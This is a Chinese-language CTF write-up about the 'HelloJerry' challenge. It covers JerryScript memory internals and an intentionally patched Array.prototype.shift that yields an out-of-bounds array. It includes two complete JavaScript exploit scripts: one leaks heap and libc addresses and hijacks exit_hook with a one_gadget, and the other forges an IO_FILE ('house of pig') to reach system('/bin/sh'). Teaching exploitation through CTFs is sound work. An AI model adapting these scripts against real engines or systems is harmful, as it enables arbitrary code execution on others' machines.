# 从一道题目来学习 JerryScript 引擎的漏洞利用

阅读量 **425893**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-03 16:30:51

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t010f80e5553a63762d.jpg)

## 前言

在上周末的深育杯线上赛中，遇到了一个挺有意思的题目，叫 `HelloJerry`，考察的是 `JerryScript`
引擎的漏洞利用。不过，由于比赛时间有限，因此比赛过程中并未解出来，赛后复现了一下，这里与各位师傅交流一下。

## 一、基础知识

在开始讲解解题思路前，我们来学习一下关于 JerryScript 的基础知识。  
这里，为了方便期间，我只挑选了做题时会使用到的内容，剩余的内容大家可以自行去了解一下。

###  1、变量表示

**1.1 Array**

在 HelloJerry 中，表达数组的结构体如下，源码在 `jerry-core/ecma/builtin-objects/ecma-globals.h`：

    
    
    typedef struct
    {
      ecma_object_descriptor_t type_flags_refs;
      jmem_cpointer_t gc_next_cp;
      union
      {
        jmem_cpointer_t property_list_cp;
        ...
      } u1;
    
      union
      {
        jmem_cpointer_t prototype_cp; 
        ...
      } u2;
    } ecma_object_t;
    
    typedef struct
    {
      ecma_object_t object; 
      ...
      union
      {
        ...
        struct
        {
          uint32_t length;
          uint32_t length_prop_and_hole_count; 
        } array;
      } u;
    } ecma_extended_object_t;
    

整个 `ecma_extended_object_t` 和 `ecma_object_t` 非常庞大，因为它描述了各种各样的内置对象，这里我只挑出了
Array 会使用到的内容。其中，有几个属性值解释一下：

  * `array->object.u1.property_list_cp`：数组的存储区域
  * `array->object.u2.prototype_cp`：数组的原型所在位置
  * `array->u.array.length`：数组的长度

我们来看一个具体的实例：

    
    
    let a = [1,2,3,4,5,6,7,8]
    

然后，我们使用 gdb 来查看一下内存：

![](https://p1.ssl.qhimg.com/t017a2f28f74c267d2d.png)

大家是否发现什么不对劲的地方？是的，`property_list_cp` 和 `prototype_cp` 的值分为 `0x5b` 和
`0x55`，这怎么就描述了一个数组的内存区所在位置呢？  
这里，就是一个有趣的地方，它在取值的时候，会调用一个函数 `jmem_decompress_pointer` 进行转换（`jerry-core/jmem-jmem-allocator.c`）：

    
    
    extern inline void *JERRY_ATTR_PURE JERRY_ATTR_ALWAYS_INLINE
    jmem_decompress_pointer (uintptr_t compressed_pointer)
    {
      JERRY_ASSERT (compressed_pointer != JMEM_CP_NULL);
      uintptr_t uint_ptr = compressed_pointer;
      ....
      const uintptr_t heap_start = (uintptr_t) &JERRY_HEAP_CONTEXT (first);
      ....
      uint_ptr <<= JMEM_ALIGNMENT_LOG;// JMEM_ALIGNMENT_LOG = 3
      uint_ptr += heap_start;
      ....
      return (void *) uint_ptr;
    }
    

这里我们可以看到，JerryScript 自己实现了一个堆结构来管理堆内存的。而 array 的寻址方式就是 `jerry_globals_heap +
array->u1.property_list_cp << 3`。通过这种方法，就能够减小内存开销，这也正是它作为轻量级 JavaScript 引擎的体现。

**1.2 direct number value**

在介绍 Array 的时候，大家是否注意到一个奇怪的现象： **似乎所有的整数都向左位移了 4 位** 。这便是 JerryScript 用于区分和处理
`立即数` 的方法，我们来看下源码：

    
    
    #define ECMA_INTEGER_NUMBER_MAX 0x7fffff
    #define ECMA_DIRECT_SHIFT 4
    #define ECMA_DIRECT_TYPE_INTEGER_VALUE 0
    
    ecma_value_t
    ecma_make_length_value (ecma_length_t number) /**< number to be encoded */
    {
      if (number <= ECMA_INTEGER_NUMBER_MAX)
      {
        return ecma_make_integer_value ((ecma_integer_value_t) number);
      }
    
      return ecma_create_float_number ((ecma_number_t) number);
    }
    
    extern inline ecma_value_t JERRY_ATTR_CONST JERRY_ATTR_ALWAYS_INLINE
    ecma_make_integer_value (ecma_integer_value_t integer_value) /**< integer number to be encoded */
    {
      JERRY_ASSERT (ECMA_IS_INTEGER_NUMBER (integer_value));
    
      return (((ecma_value_t) integer_value) << ECMA_DIRECT_SHIFT) | ECMA_DIRECT_TYPE_INTEGER_VALUE;
    }
    

可以看到，当我们传入一个整数的时候。如果它的值小于 `0x7ffffff`，就会将其当作立即数来处理，处理方式就是 `value << 4 |
0`，最末尾的 `0` 代表它的类型。  
同理，当我们进行取值操作时，JerryScript 发现该元素的值最低位为 `0`，就会将其当成立即数来处理。

**1.3 ArrayBuffer 和 DataView**

    
    
    typedef struct
    {
      ecma_extended_object_t extended_object; /**< extended object part */
      void *buffer_p; /**< pointer to the backing store of the array buffer object */
      void *arraybuffer_user_p; /**< user pointer passed to the free callback */
    } ecma_arraybuffer_pointer_t;
    
    typedef struct
    {
      ecma_extended_object_t header; /**< header part */
      ecma_object_t *buffer_p; /**< [[ViewedArrayBuffer]] internal slot */
      uint32_t byte_offset; /**< [[ByteOffset]] internal slot */
    } ecma_dataview_object_t;
    

ArrayBuffer 和 DataView 这两个对象，相信做 JavaScript 引擎漏洞挖掘的师傅们都非常熟悉了。  
这里，我们注意到，ArrayBuffer 的结构体存在 `buffer_p` 这样的一个指针，它直接指向了 ArrayBuffer
所控制的内存区域，而不是像其他对象那样，通过偏移计算来得到所控制的内存区域；而在 DataView 的结构体中，`buffer_p` 则是指向
ArrayBuffer 的结构体首部。

同样，我们来个例子看看：

    
    
    let a = ["11111111"]
    a.shift()
    ab = new ArrayBuffer(0x1000)
    dv = new DataView(ab)
    dv.setUint32(0, 0x41414141, true)
    a.shift()
    

我们下断点调试，查看内存区域：

![](https://p5.ssl.qhimg.com/t0186ff5c7a5f70b230.png)

我们可以看到，ArrayBuffer 管理的内存区域是 `0x55555561f828`，而 DataView 管理的 ArrayBuffer 对象是在
`0x55555561f588`，我们找到了刚刚写入的 `0x41414141` 就在 `0x55555561f828`。

###  2、内存管理

JerryScript 在自己程序内部，实现了一个堆管理结构，我们来看一下它的初始化过程（`jerry-main/main-jerry.c`）：

    
    
    # JERRY_GLOBAL_HEAP_SIZE (512)
    int main (int argc, char **argv)
    {
        ...
        #if defined(JERRY_EXTERNAL_CONTEXT) && (JERRY_EXTERNAL_CONTEXT == 1)
          jerry_context_t *context_p = jerry_create_context (JERRY_GLOBAL_HEAP_SIZE * 1024, context_alloc, NULL);
          jerry_port_default_set_current_context (context_p);
        #endif /* defined (JERRY_EXTERNAL_CONTEXT) && (JERRY_EXTERNAL_CONTEXT == 1) */
        ...
    }
    

可以看到，jerry_create_context 初始化的堆大小为 `1024*512`，我们跟进 `jerry_create_context`：

    
    
    jerry_context_t *
    jerry_create_context (uint32_t heap_size, /**< the size of heap */
                          jerry_context_alloc_t alloc, /**< the alloc function */
                          void *cb_data_p) /**< the cb_data for alloc function */
    {
      ...
      size_t total_size = sizeof (jerry_context_t) + JMEM_ALIGNMENT;
      ...
      heap_size = JERRY_ALIGNUP (heap_size, JMEM_ALIGNMENT);
      ...
      total_size += heap_size;
      total_size = JERRY_ALIGNUP (total_size, JMEM_ALIGNMENT);
      ...
      // 从静态内存区域中申请空间
      jerry_context_t *context_p = (jerry_context_t *) alloc (total_size, cb_data_p);
      ...
      memset (context_p, 0, total_size);
    
      uintptr_t context_ptr = ((uintptr_t) context_p) + sizeof (jerry_context_t);
      context_ptr = JERRY_ALIGNUP (context_ptr, (uintptr_t) JMEM_ALIGNMENT);
    
      uint8_t *byte_p = (uint8_t *) context_ptr;
    
      ...
      // 它的符号名为 jerry_global_heap
      context_p->heap_p = (jmem_heap_t *) byte_p;
      // heap 大小
      context_p->heap_size = heap_size;
      byte_p += heap_size;
       ...
    }
    

可以看到，`jerry_global_heap` 是分配在静态内存区域中，之后 JerryScript 的内存管理相关的操作都在这里完成，操作的相关函数为

    
    
    void *jmem_pools_alloc (size_t size);
    void jmem_pools_free (void *chunk_p, size_t size);
    void jmem_pools_collect_empty (void);
    

###  3、安装和调试方法

JerryScript 的官方源码库在 [jerryscript-project/jerryscript](https://github.com/jerryscript-project/jerryscript)
中，为了方便调试，我们选择安装 debug 版本，安装命令如下：

    
    
    python tools/build.py --debug --logging=on --error-messages=on --line-info=on
    

不过，如果安装成 DEBUG 版本，在调试的时候会遇到和 V8 一样的
`DCHECK`，导致我们无法正常调试漏洞。这里，我们可以修改一下源码（`jerryscript/jerry-core/jrt/jrt.h`）：

![](https://p2.ssl.qhimg.com/t011b789bdabe7ff714.png)

将 DEBUG 版本下的 `JERRY_ASSERT` 替换成 RELEASE 版本的 `JERRY_ASSERT`
即可，如果需要可以从我[这里](https://github.com/callmecro/My_Pwn_Study/tree/main/2021/shenyubei2021/HelloJerry)下载。  
至于调试过程，如何下断点，这里推荐几个断点（前面介绍 `变量表示` 所用到的断点均来源于此）：

  * b path/jerryscript/jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c:713
  * b path/jerryscript/jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c:721
  * b path/jerryscript/jerry-main/main-jerry.c:363

前两个断点下在漏洞发生的函数处，最后一个则是在 main 函数的结尾处。如果我们传入 exp.js 没有太大问题，一般就会走到最后的 main
结尾处，因此可以用来判断 exp.js 是否能够正常走完流程。

## 二、漏洞分析与利用

我们来查看一下题目提供的 patch 文件：

    
    
    diff --git a/jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c b/jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c
    index 52b84f89..57064139 100644
    --- a/jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c
    +++ b/jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c
    @@ -729,7 +729,7 @@ ecma_builtin_array_prototype_object_shift (ecma_object_t *obj_p, /**< object */
    
           buffer_p[len - 1] = ECMA_VALUE_UNDEFINED;
           ecma_delete_fast_array_properties (obj_p, (uint32_t) (len - 1));
    -    +      ecma_delete_fast_array_properties (obj_p, (uint32_t) (len - 2));
           return ret_value;
         }
       }
    

diff 文件给出的源码是 `ecma_builtin_array_prototype_object_shift` 函数，对应的是
`Array.prototype.shift()` 方法。可以看到，出题人故意将 `ecma_delete_fast_array_properties`
的第二个参数改为 `len - 2`。也就是说，当我们删除一个元素时，Array 的长度减少 2，那么当 `length = 1`
时显然就会发生符号溢出，产生一个 oob Array，我们来测试一下：

    
    
    let a = ["11111111"]
    a.shift()
    print(a[0])
    print(a[1])
    

来查看一下内存区域：

![](https://p4.ssl.qhimg.com/t01d673852b4a8498d7.png)

可以看到，数组的长度变成了 `0xffffffff`，这是一个超长的数组，那我们就可以借助它进行任意的越界读取。

![](https://p0.ssl.qhimg.com/t01d205aa42d2ab1895.png)

既然已经有了 oob Array，那么我们就可以尝试利用它来实现 getshell。这里，我们需要使用到我们熟悉的 ArrayBuffer 和
DataView。

前面提到，ArrayBuffer `buffer_p` 是直接存储地址值，而非像 Array
那样存储的是偏移量。那么，如果我们能够获取到这个地址值，并且将其的偏移进行修改，比如放到 ArrayBuffer 结构体的前面，那么我们是不是就可以读取到
`ArrayBuffer->buffer_p`，这样便可以泄露出 `jerry_global_heap` 的地址以及程序加载地址。  
还是以刚刚的例子来看：

    
    
    let a = ["11111111"]
    a.shift()
    ab = new ArrayBuffer(0x1000)
    dv = new DataView(ab)
    dv.setUint32(0, 0x41414141, true)
    a.shift()
    

我们查看内存：

![](https://p4.ssl.qhimg.com/t01fee262c4a7858af1.png)

可以看到 `ArrayBuffer->buffer_p` 最低位并不为 0，怎么办呢？我们可以尝试添加一些变量上去。

    
    
    let a = ["11111111"]
    a.shift()
    ab = new ArrayBuffer(0x1000)
    dv = new DataView(ab)
    dv.setUint32(0, 0x41414141, true)
    
    aa = 1111
    aaa = 1111
    aaaaaaaaaaaa = 111
    print(a[24])
    a.shift()
    

我们再次查看内存，可以看到最低位就变为 0 了。

![](https://p3.ssl.qhimg.com/t013f8c15ff6d553107.png)

为什么会这样呢？这个本质上是因为 JavaScript 的 **变量提升** ，JerryScript 会先为每个变量相关的结构体分配内存空间进行存储，而
`jerry_global_heap` 本质上是个数组，它的内存是连续分配的，因此 `ArrayBuffer->buffer_p`
的内存地址就会顺延下去了。

那么，我们尝试去读取 `ArrayBuffer->buffer_p`：

![](https://p0.ssl.qhimg.com/t014f9b97e0b19ddbee.png)

![](https://p3.ssl.qhimg.com/t017e1fd7e7631303cf.png)

既然我们可以读取了，那么我们是不是还可以进行修改呢？当然可以，只要我们计算好偏移即可，这里就不再继续演示了，各位师傅们可以自己去尝试。

## 三、解题过程

有了 oob Array，那么我们就要先泄露地址，然后尝试劫持程序流获取控制权。这里，我的思路是

  1. 通过 UAF 泄露 `jerry_global_heap`，并打印出来
  2. 修改 `ArrayBuffer->buffer_p` 为 `free_got` 表值，泄露 `free` 地址，进而得到 libc 基址
  3. 修改 `ArrayBuffer->buffer_p` 指向 libc.so 所在内存区域，进行利用。

这里需要提两个注意的点：

  1. 由于我们的 `oob Array` 只能控制低 4 个字节，因此一定要确保所有需要在 JerryScript 程序这边的信息泄露完毕，再修改 `ArrayBuffer->buffer_p` 到 libc.so 的内存，否则就再也回不到 JerryScript 这边了。
  2. 我们在编写利用脚本的时候，不管是增加变量声明还是函数调用等，都会对 `ArrayBuffer->buffer_p` 产生影响，因此这个过程需要很有耐心。另外，这也是为什么要打印出 `jerry_global_heap` 的值，利用 gdb 调试是默认关闭 `aslr`，那么 `jerry_global_heap` 的值默认就是 `0x55555561f260`（在我的虚拟机中是这样的）。因此，我们只要看每次打印出来的 `jerry_global_heap` 的低 4 位与 `5561f260` 的偏差，然后进行修正即可，可以单独使用一个变量来表示偏移，比如下面的利用脚本中的 `heap_base_offset`。

最后，关于如何 getshell，我给出了两种利用方法。  
第一种利用方式，就是劫持
`exit_hook`，具体可以参考[文章](https://blog.csdn.net/qq_43116977/article/details/105485947)  
既然我们已经泄露了 libc，那么计算 `rtld_global` 的偏移也不是什么难事。不过，这种方法会受 `ld.so` 和 `libc.so`
加载偏移的影响，这个偏移在不同环境下的值并不相同，因此感觉不太通用：

    
    
    let a = ["11111111"]
    a.shift()
    ab = new ArrayBuffer(0x1000)
    dv = new DataView(ab)
    dv.setUint32(0, 0x41414141, true)
    
    heap_base_offset = 0xa7
    jerry_global_heap = [1, 2]
    jerry_global_heap[0] = a[24] - heap_base_offset
    free_got = jerry_global_heap[0]*0x10 - 0x1490
    libc_addr = [1, 2]
    exit_hook = [1, 2]
    one_gadget = [1, 2]
    
    a[24] = jerry_global_heap[0] + 0x2e
    jerry_global_heap[1] = dv.getUint32(0x5c, true)
    jerry_global_heap[0] = jerry_global_heap[0]*0x10
    print("jerry_global_heap: 0x"+(jerry_global_heap[0]+jerry_global_heap[1]*0x100000000).toString(16))
    
    dv.setUint32(0x58, free_got, true)
    libc_addr[0] = dv.getUint32(0x8, true) - 0x9d850
    libc_addr[1] = dv.getUint32(0xc, true)
    print("libc_addr: 0x"+(libc_addr[0]+libc_addr[1]*0x100000000).toString(16))
    
    exit_hook[0] = 0x23ff60 + libc_addr[0]
    exit_hook[1] = libc_addr[1]
    print("exit_hook: 0x"+(exit_hook[0]+exit_hook[1]*0x100000000).toString(16))    
    
    one_gadget[0] = 0xe6c7e + libc_addr[0]
    one_gadget[1] = libc_addr[1]
    print("one_gadget: 0x"+(one_gadget[0]+one_gadget[1]*0x100000000).toString(16))    
    
    a[24] = a[24] + 0x177
    exit_hook = exit_hook[0]+exit_hook[1]*0x100000000
    dv.setBigUint64(0x58, exit_hook, true)
    
    one_gadget = one_gadget[0]+one_gadget[1]*0x100000000
    dv.setBigUint64(0x8, one_gadget, true)
    dv.setBigUint64(0x10, one_gadget, true)
    ab = new ArrayBuffer(0x1000)
    // a.shift()
    

第二种利用方式，则是 `house of
pig`，具体可以参考这篇[文章](https://www.anquanke.com/post/id/242640)。我们这里可以任意写，可以更加方便地修改
`_IO_list_all`、`__free_hook` 以及伪造 `IO_FILE`。  
为什么要这么大费周章，而不直接修改 `__free_hook` 就完事了呢？因为我发现，它除了开始解析 JavaScript 源码的时候，会使用到 libc
的堆，其余时候包括最后程序结束都不会再使用 libc 的堆。因此，我们需要想办法让它调用 free，进而执行到 `__free_hook` 的
`system` 函数。  
这种方法比较稳定，不会因环境不同而受影响。

    
    
    let a = ["11111111"]
    a.shift()
    ab = new ArrayBuffer(0x1000)
    dv = new DataView(ab)
    dv.setUint32(0, 0x41414141, true)
    
    heap_base_offset = 0x12e
    jerry_global_heap = [1, 2]
    jerry_global_heap[0] = a[24] - heap_base_offset
    free_got = jerry_global_heap[0]*0x10 - 0x1490
    libc_addr = [1, 2]
    free_hook = [1, 2]
    system_addr = [1, 2]
    binsh_addr = [1, 2]
    _IO_str_jumps = [1, 2]
    _IO_list_all = [1, 2]
    fake_FILE = [1,2]
    zero = 0
    
    a[24] = jerry_global_heap[0] + 0x2e
    jerry_global_heap[1] = dv.getUint32(0x5c, true)
    jerry_global_heap[0] = jerry_global_heap[0]*0x10
    jerry_global_heap = jerry_global_heap[0]+jerry_global_heap[1]*0x100000000
    print("jerry_global_heap: 0x"+jerry_global_heap.toString(16))
    
    dv.setUint32(0x58, free_got, true)
    libc_addr[0] = dv.getUint32(0x8, true) - 0x9d850
    libc_addr[1] = dv.getUint32(0xc, true)
    print("libc_addr: 0x"+(libc_addr[0]+libc_addr[1]*0x100000000).toString(16))
    
    free_hook[0] = 0x1eeb20 + libc_addr[0]
    free_hook[1] = libc_addr[1]
    print("free_hook: 0x"+(free_hook[0]+free_hook[1]*0x100000000).toString(16))    
    
    system_addr[0] = 0x55410 + libc_addr[0]
    system_addr[1] = libc_addr[1]
    binsh_addr[0] = 0x1b75aa+libc_addr[0]
    binsh_addr[1] = libc_addr[1]
    _IO_str_jumps[0] = 0x1ed560 + libc_addr[0]
    _IO_str_jumps[1] = libc_addr[1]
    
    print("system_addr: 0x"+(system_addr[0]+system_addr[1]*0x100000000).toString(16))
    print("binsh_addr: 0x"+(binsh_addr[0]+binsh_addr[1]*0x100000000).toString(16))
    print("_IO_str_jumps: 0x"+(_IO_str_jumps[0]+_IO_str_jumps[1]*0x100000000).toString(16))    
    
    a[24] = a[24] + 0x177 // &free_got -----> & control_base
    fake_FILE[0] = free_hook[0] + 0x90
    fake_FILE[1] = free_hook[1]
    fake_FILE = fake_FILE[0]+fake_FILE[1]*0x100000000
    print("fake_FILE: 0x"+fake_FILE.toString(16))
    
    free_hook = free_hook[0]+free_hook[1]*0x100000000
    system_addr = system_addr[0]+system_addr[1]*0x100000000
    binsh_addr = binsh_addr[0]+binsh_addr[1]*0x100000000
    _IO_str_jumps = _IO_str_jumps[0]+_IO_str_jumps[1]*0x100000000
    
    dv.setBigUint64(0x58, free_hook, true) 
    
    // FAKE IO_FILE
    dv.setBigUint64(0x90, zero, true) // _flag
    dv.setBigUint64(0x98, zero, true) // _IO_read_ptr
    dv.setBigUint64(0xa0, zero, true) // _IO_read_end
    dv.setBigUint64(0xa8, zero, true) // _IO_read_base
    dv.setBigUint64(0xb0, 1, true) //change _IO_write_base = 1
    dv.setBigUint64(0xb8, 0xffffffffffff, true)
    dv.setBigUint64(0xc0, zero, true)
    dv.setBigUint64(0xc8, binsh_addr, true)
    dv.setBigUint64(0xd0, binsh_addr+0x8, true)
    
    dv.setBigUint64(0xd8, zero, true)
    dv.setBigUint64(0xe0, zero, true)
    dv.setBigUint64(0xe8, zero, true)
    dv.setBigUint64(0xf0, zero, true)
    dv.setBigUint64(0xf8, zero, true)
    dv.setBigUint64(0x100, zero, true)
    dv.setBigUint64(0x108, zero, true)
    dv.setBigUint64(0x110, zero, true)
    dv.setBigUint64(0x118, zero, true)
    dv.setBigUint64(0x120, zero, true)
    dv.setBigUint64(0x128, zero, true)
    dv.setBigUint64(0x130, zero, true)
    dv.setBigUint64(0x138, zero, true)
    dv.setBigUint64(0x140, zero, true)
    dv.setBigUint64(0x148, zero, true)
    dv.setBigUint64(0x150, zero, true)
    dv.setBigUint64(0x158, zero, true)
    dv.setBigUint64(0x160, zero, true)
    dv.setBigUint64(0x168, _IO_str_jumps, true)
    
    dv.setBigUint64(0x8, system_addr, true)
    dv.setBigUint64(0xa40, fake_FILE, true)
    
    a[24] = a[24] - 0x259  // &free_hook - 0x8 -----> &_IO_list_all - 0x10
    dv.setBigUint64(0x10, fake_FILE, true)
    
    // a.shift()
    

最后，还是需要提一下：我这里使用的是自己编译的 JerryScript，与题目给的 JerryScript 并不相同，偏移需要自己调整一下。  
运行 jerry 来执行利用脚本，即可 getshell：

![](https://p2.ssl.qhimg.com/t01804d716e72e53df3.png)

## 四、总结

总的来说，这其实是一道不错的题目，很考察选手的现学能力，但不太好的一点就是放在 8
个小时的比赛中，做题时间太短了（也许是我太菜了）。不过，还是感谢主办方，提供了这么一道高质量题目。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **callmecro** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/259897](/post/id/259897)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [Javascript](/tag/Javascript)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg) callmecro

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

